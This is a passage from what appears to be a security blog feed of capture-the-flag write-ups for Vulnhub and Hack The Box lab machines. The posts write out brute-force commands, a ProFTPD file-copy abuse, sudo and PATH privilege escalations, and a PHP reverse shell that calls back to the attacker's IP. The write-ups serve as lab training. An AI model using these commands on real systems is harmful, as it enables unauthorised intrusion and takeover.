href="#Continuing-the-series" class="headerlink" title="Continuing the series"></a>Continuing the series</h1><p>This blogpost will help you in understanding the what and why of Revserse Oriented Programming. All of the resources will help you in understanding the Assembly and a little of reverse engineering.</p><p>Next I’ll be posting how to get build a ROP chain from binary. Until then, read out all the resoures.</p>]]></content>
      
      
      <categories>
          
          <category> Return Oriented Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop, pwn, bof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Pumpkin Festival</title>
      <link href="/2019/07/24/pumpkin-festival/"/>
      <url>/2019/07/24/pumpkin-festival/</url>
      
        <content type="html"><![CDATA[<p>Today, we are going to pwn Pumpkin Festival from Vulnhub.</p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Starting off with the nmap using <code>nmap -sV -sC -A -p- -T5 192.168.43.17</code> reveals that we have FTP, HTTP and SSH at 6880.</p><p><img src="/img/Pumpkin-Festival/nmap.png" alt> </p><h1 id="Tokens"><a href="#Tokens" class="headerlink" title="Tokens"></a>Tokens</h1><p>From the first discovery I found that flag are named as token and that is our challenge i.e. finding all tokens.</p><h4 id="First"><a href="#First" class="headerlink" title="First"></a>First</h4><p>First one was at the botttom of the HTML page can be viewed upon inspection of the page.</p><p><img src="/img/Pumpkin-Festival/first.png" alt> </p><h4 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h4><p>With the result of nmap scan we seen that anaonymous login is open. Using the package <code>ftp</code> we logged into the machine and  in the directory named secret we found a file named <code>token.txt</code> having the second token.</p><blockquote><p>PumpkinToken : 2d6dbbae84d724409606eddd9dd71265</p></blockquote><p><img src="/img/Pumpkin-Festival/second.png" alt></p><h4 id="Third"><a href="#Third" class="headerlink" title="Third"></a>Third</h4><p>This one requires bruteforcing the FTP service in order to get token, as we have inspected HTTP client for first we saw that there is a user named harry. On the basis of that assumption, using <code>hydra -l harry -P rockyou.txt 192.168.43.17 ftp -t 60</code>, it will take some time so don’t get impatient.</p><p>Password of user <strong>harry</strong>:-</p><p><img src="/img/Pumpkin-Festival/harry-ftp.png" alt></p><p>Logging in with user <strong>harry</strong> shows that we have a <code>token.txt</code> and a directory named <code>Donotopen</code>. Get the token and start changing directories.</p><blockquote><p>PumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e</p></blockquote><h4 id="Forth"><a href="#Forth" class="headerlink" title="Forth"></a>Forth</h4><p>While logged in FTP, and chanaging bunch <strong>NO</strong> named nested directories, we get another token and a <code>data.txt</code>.</p><blockquote><p>PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c</p></blockquote><p>That <code>data.txt</code> was a tar file which can be confirmed using <code>file data.txt</code>. </p><p>Extracting it gives a hex encoded OpenSSL Private Key.</p><p><img src="/img/Pumpkin-Festival/tarfile.png" alt></p><h4 id="Fifth"><a href="#Fifth" class="headerlink" title="Fifth"></a>Fifth</h4><p>Checking <code>robots.txt</code> on a HTTP we get see a <code>/tarck/track.txt</code>, going to that webpage we see:-</p><hr><p>Hey Jack!</p><p>Thanks for choosing our local store. Hope you like the services.<br>Tracking code : 2542 8231 6783 486</p><p>-Regards<br><a href="mailto:admin@pumpkins.local" target="_blank" rel="noopener">admin@pumpkins.local</a></p><hr><p><code>admin@pumpkins.local</code> seems interesting, editing the hosts file we add <code>pumpkia.local</code>. After this, we get a wordpress temed website. Using wpscan doesn’t give any interesting results. So, using dirb we see a lot of pages which can be seen at any normal wordpress website.</p><p><img src="/img/Pumpkin-Festival/dirb.png" alt></p><p>Going to <code>readme.html</code> it shows a base?? encoded data, using CyberChef and trying multiple bases we can see it’s a base64 data which decodes to credentails.</p><hr><!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0">    <meta name="viewport" content="width=device-width"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><h1 id="logo">    <a href="https://wordpress.org/" target="_blank" rel="noopener"><img alt="WordPress" src="wp-admin/images/wordpress-logo.png"></a></h1><p style="text-align: center">Semantic Personal Publishing Platform</p><center><h2>-- This content is removed because of security purposes --</h2><p>K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s</p></center></body></html><hr><blockquote><p>morse &amp; jack : Ug0t!TrIpyJ</p></blockquote><p>So, logging into the wordpress with as morse we see that there is a flag in biographical info.</p><blockquote><p>PumpkinToken : 7139e925fd43618653e51f820bc6201b</p></blockquote><h4 id="Sixth"><a href="#Sixth" class="headerlink" title="Sixth"></a>Sixth</h4><p>Now, so we had a OpenSSL private key, we can use it to get into the machine via SSH as jack with <code>ssh -i key jack@192.168.43.17 -p 6880</code> we get into the system.</p><p><img src="/img/Pumpkin-Festival/ssh.png" alt></p><p>In the home directory we can see a ELF named token, running it we can get our seventh token.</p><blockquote><p>PumpkinToken : 8d66ef0055b43d80c34917ec6c75f706</p></blockquote><h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>Using wordpress credentials for jack we can use sudo. Using <code>sudo -l</code> we can see that creating a file within <code>/home/jack/pumpkin/alohomora</code> we can execute any binary. From our previous encounter of privilege escalation we are going to create a binary named alohooa.</p><pre><code>jack@pumpkin:~/pumpkins$ echo &quot;/bin/sh&quot; &gt; alohomorajack@pumpkin:~/pumpkins$ chmod +x alohomorajack@pumpkin:~/pumpkins$ sudo ./alohomora# iduid=0(root) gid=0(root) groups=0(root)# whoami; id; cd root; cat *.txtrootuid=0(root) gid=0(root) groups=0(root)</code></pre><p>Hence, checking the root directory we can see a great art of pumpkin.</p><p><img src="/img/Pumpkin-Festival/root.png" alt></p><h3 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h3><p>Thanks to <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a> and <a href="https://twitter.com/mrhenrike" target="_blank" rel="noopener">Andre</a> for helping me out.</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Symfonos-2</title>
      <link href="/2019/07/20/symfonos/"/>
      <url>/2019/07/20/symfonos/</url>
      
        <content type="html"><![CDATA[<p>Today, we are going to pwn Symfonos 2 from Vulnhub.</p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Starting off with Nmap, using <code>nmap -sV -sC -A -p- -T5 192.168.43.85</code> shows that we have FTP, SSH, HTTP and SMB port. </p><p><img src="/img/symfonos2/nmap.png" alt></p><h1 id="HTTP-and-FTP-Enumeration"><a href="#HTTP-and-FTP-Enumeration" class="headerlink" title="HTTP and FTP Enumeration"></a>HTTP and FTP Enumeration</h1><p>Going to the HTTP port shows a similar image that we encountered in previous symfonos machine. Nothing is there, running gobuster, dirb and other web crawlers gave nothing. So moving over to SMB, sice it has <code>Backup</code> folder which is publicly accessible, we can see a <code>log.txt</code>. It has following data:</p><p>SAO, we get know thatthere is user aeolus and the directory where backup is being stored.<br>So, as we knew FTP service is available which is ProFTP 1.3.5, searching for the exploit on ExploitDB. It has a exloit of mod_copy which allows you to copy files from one folder to another. <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a> discovered it.<br>We tried it and we were almost close to making it work but alas, we couldn’t. It was just a silly mistake and from this point we accidentaly did the machine in a <strong>very</strong> unintended way. </p><pre><code>site cpfr /etc/passwd350 File or directory exists, ready for destination namesite cpto &lt;?php phpinfo(); ?&gt;550 cpto: Permission deniedsite cpfr /proc/self/fd/3350 File or directory exists, ready for destination namesite cpto /var/www/test.php</code></pre><h4 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h4><p>I will explain the other method at last which <a href="https://twitter.com/zayotic" target="_blank" rel="noopener">@zayotic</a> told  <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a> after completion of machine.</p><h1 id="FTP-Bruteforce-and-SSH-Login"><a href="#FTP-Bruteforce-and-SSH-Login" class="headerlink" title="FTP Bruteforce and SSH Login"></a>FTP Bruteforce and SSH Login</h1><p>Well, from this point using <strong>THC-Hydra</strong> and <strong>rockyou.txt</strong> we got the password of user aeolus. <code>hydra -l aeolus -P rockyou.txt 192.168.43.85 ftp -t 40</code> reveals that the password is <code>sergioteamo</code>. Now, we tried it to SSH into the machine with the same creentials.</p><p><img src="/img/synfonos2/hydra.png" alt></p><p><strong>SSH Login</strong></p><p><img src="/img/symfonos2/ssh.png" alt></p><h1 id="Privilge-Escalation"><a href="#Privilge-Escalation" class="headerlink" title="Privilge Escalation"></a>Privilge Escalation</h1><p>With some enumeration, I foud that there are 2 users <strong>aeolus</strong> and <strong>cronus</strong>. I tried it enumerate everything I can but at the it was a wild goose chase. So <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a> told to me check <code>/etc/apache2</code> folder and checking some files from that I cme to know that there is a local web server running on the machine, to confirm this I used <strong>curl</strong> which confirms it. So using <code>socat TCP-LISTEN:5000;fork,reuseaddr 127.0.0.1:8080</code> we just forked te actual port i.e. 8080 to 5000 of the actual web server, now visiting to <code>http://192.168.43.85:5000</code> shows that it is a <strong>LibreNMS</strong> based web application. I checked ExploitDB and it has exploit for adding a hostname that will give reverse shell, using metasploit I added the module to the <code>~/.ms4/exploits</code> directory.</p><p><img src="/img/symfonos2/website.img" alt></p><p>As the exploit will start working it will give a reverse shell as the user <strong>cronus</strong>. Using <code>sudo -L</code> we can see that <strong>mysql</strong> can be run as root. <a href="https://gtfobins.github.io" target="_blank" rel="noopener">GTFOBins</a> to the rescue.</p><p>That has shown that using <code>sudo mysql &#39;\! /bin/sh</code> we can spawn root shell.</p><p><img src="/img/symfonos2/sql.png" alt></p><p><img src="/img/symfonos2/root.png" alt></p><p><strong>The Flag</strong></p><p><img src="/img/symfonos2/flag.png" alt></p><h1 id="Intended-Way"><a href="#Intended-Way" class="headerlink" title="Intended Way"></a>Intended Way</h1><p>As much as I was happy for pwning this machine but it was temporry the main learning part is missed in it by using hydra.<br>So as I mentioned eariler we were supposed to use that ProFTP 1.3.5 vulnerbaility which can be found here to copy files from one folder to another. From that exploit we can copy the files from any folder and copy it to <code>/home/aeolus/share/</code> that will make that file publicly accessible to us via SMB. So, copying the file <code>/var/backups/shadow.bak</code> to <code>/home/aeolus/share/shadow.txt</code>. After that it will be available to SMB service which can be used to dump the users password and then cracked with <strong>john</strong> to crack the hash of the user <strong>aeolus</strong>.</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p>ProFTP 1.3.5 - File Copy: <a href="https://www.exploit-db.com/exploits/36742" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36742</a><br>GTFOBins: <a href="https://gtfobins.github.io" target="_blank" rel="noopener">https://gtfobins.github.io</a><br>LibreNMS Exploit: <a href="https://www.exploit-db.com/exploits/46970" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46970</a></p><h4 id="Thanks-to"><a href="#Thanks-to" class="headerlink" title="Thanks to"></a>Thanks to</h4><p><a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a><br><a href="https://twitter.com/DCAU7" target="_blank" rel="noopener">@DCAU7</a> </p><h4 id="Detailed-version-og-intended-way"><a href="#Detailed-version-og-intended-way" class="headerlink" title="Detailed version og intended way."></a>Detailed version og intended way.</h4><p>The very detail version of the intended way is covered by <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a> in his <a href="https://mzfr.github.io/symfonos2" target="_blank" rel="noopener">writeup</a>.</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - PumpkinRaising</title>
      <link href="/2019/07/17/pumpkin-garden/"/>
      <url>/2019/07/17/pumpkin-garden/</url>
      
        <content type="html"><![CDATA[<p>Today, we are going to pwn PumpkinrRaising from Vulnhub.</p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Starting off with nmap and using <code>nmap -sV -sC -A -p- -T5 192.168.43.92</code> shows that only 2 ports are opren <code>22</code>, <code>80</code>. </p><p><img src="/img/pumpkin-garden/nmap.png" alt></p><h1 id="Surfing-on-HTTP-and-Enumeration"><a href="#Surfing-on-HTTP-and-Enumeration" class="headerlink" title="Surfing on HTTP and Enumeration"></a>Surfing on HTTP and Enumeration</h1><p>So from above nmap scan we can see there is a <code>robots.txt</code> file with most diasllowed enteries but first off we should check off the source of the index page.</p><p><img src="/img/pumpkin-garden/robots.png" alt></p><h4 id="First-ID"><a href="#First-ID" class="headerlink" title="First ID"></a>First ID</h4><p>Now, moving on further we can see <code>robots.txt</code> has a gpg file path so using curl we get it on system <code>curl http://192.168.43.92/seeds/seed.txt.gpg &gt; seeds.txt.gpg</code>. Upon checking it it turns out to be AES-256 encrypted ciphertext, we need a key in ordwe to decrypt it. Finding the key was kind of guessy and more like connecting dots. I tried several passphrases but it fails everytime so I started checking index page again for some hint, there were3 words <code>SEED - WATER - SUNLIGHT</code>, so I tried <code>SEEDWATERSUNLIGHT</code> turns out to be the right key which gives <code>seeds.txt</code> which has morse code which decodes to another 5 digit ID.</p><blockquote><p>YIPPEE! YOU ARE ON THE RIGHT PATH… BIGMAXPUMPKIN SEEDS ID: 69507 </p></blockquote><h4 id="Second-ID"><a href="#Second-ID" class="headerlink" title="Second ID"></a>Second ID</h4><p> Upon analyzing it, we can see there is a <code>pumpkin.html</code> so going thre didn’t give any hint so I checked source of that page which guves base32 encoded data.<br>Decoding that data with <code>echo -n | base32 -d</code> gives path for a pcap file.<br>This one was pcap forensics challenge but easy one, as we saw the pcap file in one of the disallowed enteries. Opening it in wireshark and following TCP stream we can see there is a conversation and hence we can see our third ID.</p><hr><p>Hey Jack, Robert has given me your contact. I’m sure I have the seeds that you want<br>Hi Mark, I’m greatful that you have the seeds<br>Please share the seed ID so that I can get you exact seeds<br>Sure, 50609 is the ID<br>Thank you, I have the seeds. You’ll get your seeds in a couple of days<br>Thank you so much Mark<br>You’re welcome</p><hr><p><img src="/img/pumpkin-garden/second.png" alt></p><h4 id="Third-ID"><a href="#Third-ID" class="headerlink" title="Third ID"></a>Third ID</h4><p>Checking the source code of index page shows a route for <code>pumpkin.html</code> which was also a pumpkin page so checking the source again shows bunch of hex characters at the very bottom of the page which decode to:</p><hr><p>59 61 79 21 20 41 70 70 72 65 63 69 61 74 65 20 79 6f 75 72 20 70 61 74 69 65 6e 63 65 20 3a 29 0a 41 6c 6c 20 74 68 69 6e 67 73 20 61 72 65 20 64 69 66 66 69 63 75 6c 74 20 62 65 66 6f 72 65 20 74 68 65 79 20 62 65 63 6f 6d 65 20 65 61 73 79 2e 0a 41 63 6f 72 6e 20 50 75 6d 70 6b 69 6e 20 53 65 65 64 73 20 49 44 3a 20 39 36 34 35 34 0a 0a 44 6f 2c 20 72 65 6d 65 6d 62 65 72 20 74 6f 20 69 6e 66 6f 72 6d 20 4a 61 63 6b 20 74 6f 20 70 6c 61 6e 74 20 61 6c 6c 20 34 20 73 65 65 64 73 20 69 6e 20 74 68 65 20 73 61 6d 65 20 6f 72 64 65 72 2e</p><blockquote><p>Yay! Appreciate your patience :)                                                                                                                                All things are difficult before they become easy.                                                                                                             Acorn Pumpkin Seeds ID: 96454                                                                                                                                                                                                                                                                                                     Do, remember to inform Jack to plant all 4 seeds in the same order.</p></blockquote><hr><h4 id="Fourth-ID"><a href="#Fourth-ID" class="headerlink" title="Fourth ID"></a>Fourth ID</h4><p>This took sometime since we had already check all the things and I checked way too much time every single page and I started checking <code>underconstruction.html</code> wecan see there is a gif file so I started checking it, I was cluless here so <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a> and he told me to use stegosuite for it. So, using <code>stegosuite -x jackolantern.gif -k &lt;password&gt;</code>, so we need a password for it as well. I tried using everything for that but nothing. So as we saw i <code>robots.txt</code> it has a disallowed entry for <code>/hidden/note.txt</code> file.<br>Upon opening it we can see credentials combos, </p><hr><p>Robert : C@43r0VqG2=<br>Mark : Qn@F5zMg4T<br>goblin : 79675-06172-65206-17765</p><hr><p>I tried every password of the above users and got a success with Mark’s which gives <code>decorative.txt</code> which has fourth and last 5 digit ID.</p><p><img src="/img/pumpkin-garden/stegosuite.png" alt></p><hr><p>Fantastic!!! looking forward for your presence in pumpkin party.<br>Lil’ Pump-Ke-Mon Pumpkin seeds ID : 86568</p><hr><h1 id="SSH-Login-and-Root-Flag"><a href="#SSH-Login-and-Root-Flag" class="headerlink" title="SSH Login and Root Flag"></a>SSH Login and Root Flag</h1><p>So, as we got hint from last seed “it has to planteded in same order”, so that means we need to get them in correct order which is</p><hr><p>69507<br>50609<br>96454<br>86568</p><hr><p>So, using this passord which is <code>69507506099645486568</code> for user <code>jack</code> we looged into pumpkin machine.</p><p><img src="/img/pumpkin-garden/ssh.png" alt></p><p>So using <code>sudo -l</code> to find which binary we can use as sudo which gives that strace can be used as sudo user.<br>Few weeks ago, I tried <code>unknowndevices64</code> which had a similar type of root privilege.<br>So, <code>sudo strace -o /dev/null /bin/sh</code> spawns a root shell for us and hence we can use read root flag.</p><p><img src="/img/pumpkin-garden/root.png" alt></p><p>That was it folks, we got it. It was great CTF based machine for beginners. Kudos to <a href="https://twitter.com/0xmzfr" target="_blank" rel="noopener">@mzfr</a> for helping me out.</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box - Friendzone</title>
      <link href="/2019/07/12/friendzone/"/>
      <url>/2019/07/12/friendzone/</url>
      
        <content type="html"><![CDATA[<p>Today, we are going to pwn Friendzone from Hack The Box.</p><h1 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h1><ul><li>Nmap scan of the machine </li><li>Checking SMB service and HTTP</li><li>Using <code>dig</code> to get subdomians</li><li>Uploading PHP reverse shell </li><li>Callback the reverse shell by exploiting LFI(Local File Inclusion)</li><li>Getting user flag and SSH credentials</li><li>Using cronjob to get root flag</li></ul><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Starting off with the nmap, <code>nmap -sV -sC -A 10.10.10.123</code> shows so many open ports but we have to start somewhere.<br>It includes:-</p><ul><li>21 - FTP</li><li>22 - SSH</li><li>53 - DNS</li><li>80 - HTTP</li><li>139 &amp; 445 - SMB</li><li>443 - SSL/HTTP</li></ul><p><img src="/img/friendzone/nmap.png" alt></p><h1 id="SMB-and-HTTP-Enumeration"><a href="#SMB-and-HTTP-Enumeration" class="headerlink" title="SMB and HTTP Enumeration"></a>SMB and HTTP Enumeration</h1><p>Using smbmap reveals we have access to <code>general</code> for read only and <code>Development</code> for read/write access.<br>So, we connect to <code>SMB</code> by using <code>smbclient //10.10.10.123/general/ -u root</code>  reveals we see <code>creds.txt</code> so we get it on our machine.</p><p>Now, <code>Developement</code> seems empty so I headover to HTTP port, it was basic html page without only one useful information <strong>subdomain</strong>. We noticed it has a subdomian named <code>friendzone.red</code>.<br>Running <code>gobuster</code> reveals nothing useful, so I moved on to DNS recon.</p><h1 id="DNS-Enumeration-and-Login"><a href="#DNS-Enumeration-and-Login" class="headerlink" title="DNS Enumeration and Login"></a>DNS Enumeration and Login</h1><p>Using <code>dig axrf friendzone.red @10.10.10.123</code> reveals a <code>administartor1.friendzone.red</code> so heading over to that shows a login page, loggin with the previous obtained credentials <code>admin:WORKWORKHhallelujah@#</code> , tell us to redirect to <code>dashboard.php</code>.</p><p><img src="/img/friendzone/dig.png" alt></p><p><img src="/img/friendzone/admin.png" alt></p><p><img src="/img/friendzone/creds.png" alt></p><h1 id="Exploiting-LFI-vulnerability-and-callback-Reverse-Shell"><a href="#Exploiting-LFI-vulnerability-and-callback-Reverse-Shell" class="headerlink" title="Exploiting LFI vulnerability and callback Reverse Shell"></a>Exploiting LFI vulnerability and callback Reverse Shell</h1><p>This page seems told us to access url <code>default is image_id=a.jpg&amp;pagename=timestamp</code>, seems LFI isn’t it?</p><p>From previous SMB enumeration we knew that <code>Development</code> directory has read/write access so using php reverse shell wecan get access to friendzone machine.</p><p>Using folllowing code as <code>phpinfo.php</code>:-</p><pre><code>&lt;?phpexec(“/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/10.10.14.156/1234 0&gt;&amp;1’”);phpinfo();?&gt;</code></pre><p>we uploaded it to <code>Development</code> directory by</p><p><code>curl --upload-file phpinfo.php -u &#39;root&#39; smb://10.10.10.123/Development/</code>, we uploaded our shell.</p><p><img src="/img/friendzone/rev.png" alt></p><h4 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h4><p>From previously found LFI, we access the our phpinfo file by<br><code>https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&amp;pagename=/etc/Development/phpinfo</code></p><p><img src="/img/friendzone/lfi.png" alt></p><p>Not <code>a.jpg</code> because it was default so no need to, so back to our listener we get a shell.</p><p><img src="/img/friendzone/revs.png" alt></p><h4 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h4><p>Once your listener get connected to our uploaded reverse shell you can get user flag.</p><p><img src="/img/friendzone/user.png" alt></p><h1 id="Getting-SSH-Credentials"><a href="#Getting-SSH-Credentials" class="headerlink" title="Getting SSH Credentials"></a>Getting SSH Credentials</h1><p>Checking directory and file reveals a interseting file named <code>mysql_data.conf</code> has following credentials:-</p><hr><blockquote><p>for development process this is the mysql creds for user friend</p></blockquote><blockquote><p>db_user=friend</p></blockquote><p>db_pass=Agpyu12!0.213$</p><blockquote><p>db_name=FZ</p></blockquote><hr><p><img src="/img/friendzone/sshcreds.png" alt></p><h1 id="SSH-Login-and-root-flag"><a href="#SSH-Login-and-root-flag" class="headerlink" title="SSH Login and root flag"></a>SSH Login and root flag</h1><p>Well, we login to ssh using previous credentials.</p><p><img src="/img/friendzone/ssh.png" alt></p><h3 id="Analyzing-Running-Processes"><a href="#Analyzing-Running-Processes" class="headerlink" title="Analyzing Running Processes"></a>Analyzing Running Processes</h3><p>There was a ELF file named <code>pspy64</code>, executing it shows running jobs in which we can very interesting process whuch was a python file.</p><p><img src="/img/friendzone/cronjob.png" alt></p><p>Head over <code>/opt/server_admin/reporter.py</code> shows a nothing more than bunch of commented out line of python code.</p><pre><code>#!/usr/bin/pythonimport osto_address = “admin1@friendzone.com”from_address = “admin2@friendzone.com”print “[+] Trying to send email to %s”%to_address#command = ‘’’ mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass “PAPAP”’’’#os.system(command)# I need to edit the script later# Sam ~ python developer</code></pre><p>We can see a line importing python os module, since we don’t have modify permissions for reporter.py we head over <code>/usr/bin/python2.7</code>  we can edit os.py i.e python’s <code>os</code> module which has a function which allows us to execute any command by passing them as parameter. </p><p>For example:-</p><pre><code>import osos.sytem(&#39;whoami&#39;) #friend</code></pre><p>So we add a single line of code at the very end of <code>os.py</code> </p><pre><code>system(&#39;cp /root/root.txt /tmp/root1.txt&#39;) # calling system functon and copying flag</code></pre><p>Hence, waiting for few minutes gives <code>root1.txt</code>.</p><p><img src="/img/friendzone/root.jpg" alt></p><p><strong>Done!!</strong></p><img src="https://www.hackthebox.eu/badge/image/129534" alt="Hack The Box">]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, HacktheBox, htb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Silky CTF 0x01</title>
      <link href="/2019/07/08/silky-ctf/"/>
      <url>/2019/07/08/silky-ctf/</url>
      
        <content type="html"><![CDATA[<p>Today, we are going to pwn Silky CTF: 0x01 from Vulnhub.</p><h1 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h1><ul><li>Host Discovery</li><li>Nmap Scan of the machine</li><li>Checking for disallowed entry in <code>robots.txt</code></li><li>Password recovery</li><li>SSH bruteforce of user silky</li><li>Privilege Escalation</li></ul><h1 id="Host-Discovery"><a href="#Host-Discovery" class="headerlink" title="Host Discovery"></a>Host Discovery</h1><p>Running <code>nmap -sn 192.168.43.0/24</code> will quickly gives the list of alive host from where we can see our silky machine ip.</p><p><img src="/img/silky/host.png" alt></p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Starting with nmap, we do <code>nmap -sV -sC -A 192.168.43.232</code>. Although this command is very useful as it provides us a good amount of information on our host.</p><p><img src="/img/silky/nmap.png" alt></p><h1 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h1><p>So, from above nmap result we can see there’s a note.txt is on the server. Accessing that webpage gives german text which translates to:</p><blockquote><p>I absolutely have to remove the password from the page, after all, the last 2 characters are missing. But still.</p></blockquote><p>Hmm, I didn’t see any password. So I run dirb but no luck. So I went to examine the index page and from the source we can see that there is a javascript file, so I checked it and found first five characters of password. Now we need to guess 2 mre characters.</p><p><img src="/img/silky/js.png" alt></p><h1 id="Password-Recovery-and-SSH-bruteforce"><a href="#Password-Recovery-and-SSH-bruteforce" class="headerlink" title="Password Recovery and SSH bruteforce"></a>Password Recovery and SSH bruteforce</h1><h3 id="Generating-Custom-Passwords"><a href="#Generating-Custom-Passwords" class="headerlink" title="Generating Custom Passwords"></a>Generating Custom Passwords</h3><p>So, one of the useful tool here is <code>crunch</code> available on kali linux, so I used it to make a password file.</p><pre><code>crunch 7 7 s1lKy^% &gt; pass.txt</code></pre><h4 id="Command-Explaination"><a href="#Command-Explaination" class="headerlink" title="Command Explaination"></a>Command Explaination</h4><p><code>7 7</code> - Since we know that password is 7 character long we use it define that we need minimum of 7 and maximum of 7 characters/<br><code>^%</code> - This is used to specified that last 2nd character is a symbol and last one is a digit.</p><h3 id="SSH-Bruteforce"><a href="#SSH-Bruteforce" class="headerlink" title="SSH Bruteforce"></a>SSH Bruteforce</h3><p>So, whenever it comes to bruteforce hydra to the rescue.</p><pre><code>hydra -l silky -P pass.txt 192.168.43.232 ssh</code></pre><p><img src="/img/silky/ssh.png" alt></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>So, trying our <code>find / -perm -u=s -type f 2&gt;/dev/null</code> gives a interesting binary executable file named <code>sky</code>.</p><p><img src="/img/silky/find.png" alt></p><p>So, using <code>strings /usr/bin/sky</code> reveals some information on how the binary works.</p><p><img src="/img/silky/strings.png" alt></p><h4 id="Spawning-root-shell-by-xploiting-PATH-variable"><a href="#Spawning-root-shell-by-xploiting-PATH-variable" class="headerlink" title="Spawning root shell by xploiting PATH variable"></a>Spawning root shell by xploiting PATH variable</h4><p>So, as we know it is using <code>whoami</code> so I did the following:</p><pre><code>cd /tmpecho &quot;/bin/sh&quot; &gt; whoamichmod 777 whoamisky</code></pre><p>Kaboom, we’re root now.</p><p><img src="/img/silky/root.png" alt></p><p>This was an easy Vulnhub machine and a great way to learn about generating custom passwords using <code>crunch</code>.</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap, ctf, vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Symfonos</title>
      <link href="/2019/07/06/smfonos/"/>
      <url>/2019/07/06/smfonos/</url>
      
        <content type="html"><![CDATA[<p>Today, we are going to pwn Symfonos from Vulnhub.</p><h3 id="Machine-Setup"><a href="#Machine-Setup" class="headerlink" title="Machine Setup"></a>Machine Setup</h3><p>Nothing much to setup in the machine, just import it to Virtualbox and choose the networking setting as per your ease, I chose the Bridge Networking as it’s easy to setup.</p><h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><ul><li>Nmap scan of the machine.</li><li>Checking the SMB server for files.</li><li>Checking Helios folder for important files.</li><li>Discovering the WordPress website in <code>/h3l105</code> route.</li><li>Scanning website for the vulnerabilities via wpscan.</li><li>Exloiting Mail Masta 1.0 Plugin for LFI(Local File Inclusion).</li><li>Enumerating SMTP server.</li><li>Using SMTP for getting a reverse shell thrrough <code>/var/mail/helios</code> as Helios on machine.</li><li>Gaining root peivileges by exploiting <code>/opt/statuscheck</code> binary.</li></ul><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Let’s get started, using <code>nmap -sV -sC -A 192.168.43.12</code> reveals HTTP, SSH, SMTP, and SMB. </p><p><img src="/img/symfonos/symfonosnmap.png" alt></p><h1 id="SMB-service-enumeration"><a href="#SMB-service-enumeration" class="headerlink" title="SMB service enumeration"></a>SMB service enumeration</h1><p>Honestly speaking, I’ve had some problems using <code>smbclient</code> so I usually take the help of inbulit File application connect to server feature.<br>So moving to File, I connectedto the server and there were two folders, first <strong>Anonymous</strong> and second <strong>Helios</strong>, Helios folder was password protected and Anonymous was avilable to everyone so I checked <strong>Anonymous</strong> folder and there was a file named as <code>attention.txt</code>. </p><p><img src="/img/symfonos/symfonossmb.png" alt></p><p>It has following information:-</p><hr><blockquote><p>Can users please stop using passwords like ‘epidioko’, ‘qwerty’ and ‘baseball’! Next person I find using one of these passwords will be fired!</p></blockquote><p>-Zeus</p><hr><p>So, using those password one by one for helios folder reveals folder’s files with password <code>qwerty</code>.<br>It has 2 files <code>research.txt</code> and <code>todo.txt</code>.</p><hr><p>research.txt</p><blockquote><p>Helios (also Helius) was the god of the 